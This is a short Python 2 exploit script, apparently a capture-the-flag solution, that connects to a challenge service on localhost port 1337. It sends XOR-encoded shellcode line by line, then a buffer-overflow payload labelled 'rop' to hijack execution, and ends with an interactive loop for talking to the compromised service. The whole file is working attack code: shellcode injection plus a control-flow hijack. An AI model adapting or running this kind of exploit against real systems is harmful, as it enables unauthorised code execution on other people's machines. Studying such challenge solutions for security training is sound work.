from socket import create_connection as cc
import socket

addr = ("localhost", 1337)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
s.connect(addr)

# sock = cc(addr)
sock = s
print s.recv(100500)
print s.recv(100500)


# self.datareg_names = ["eax","ebx","ecx","edx","esi","edi","edid","esp"]

xorchar = chr(0b1000000)
xorord = ord(xorchar)

#preparing lines beyond first
shellcode = "\x31\x42" + xorchar*8 #load "@@..." to ebx
shellcode += "\x32\x21\x32\x20\x49\x40"
assert len(shellcode) % 2 == 0
amount = len(shellcode) / 2

shellcode_lines = []
i = 0
while i < amount:
    cline = "\x40"*30
    cline += shellcode[2*i] + shellcode[2*i+1]
    shellcode_lines += [cline]
    i += 1

#sending amount
amount += 1 #account for the first line
print "sending amount = %d" % amount
sock.send(str(amount) + chr(10))
print sock.recv(100500)

#sending execution line1

line1 =  "\x31\x40" + chr(ord("f")^xorord) + chr(ord("l")^xorord) + xorchar*6
line1 += "\x31\x41" + chr(ord("a")^xorord) + chr(ord("g")^xorord) + xorchar*6

assert len(line1) <= 28
line1 = line1.ljust(28, "\x40")
line1 += "\x33\x43\x40\x40"
print "SENDING FIRST LINE " + line1
sock.send(line1 + "\n")
print sock.recv(100500)

#sending other lines
print "sending other lines"
for line in shellcode_lines:
    sock.send(line + "\n")
    print sock.recv(100500)


length = 17
sock.send(str(length) + "\n")
print sock.recv(100500)

# payload = "a"*32 + "\x40" + chr(0x45 + amount - 1) -- for going up
payload = "a"*32 + "\x40" + chr(0x45)
print "sending rop" + payload
sock.send(payload + "\n")
print sock.recv(100500)

while True:
    sock.send(raw_input() + "\n")
    print sock.recv(100500)
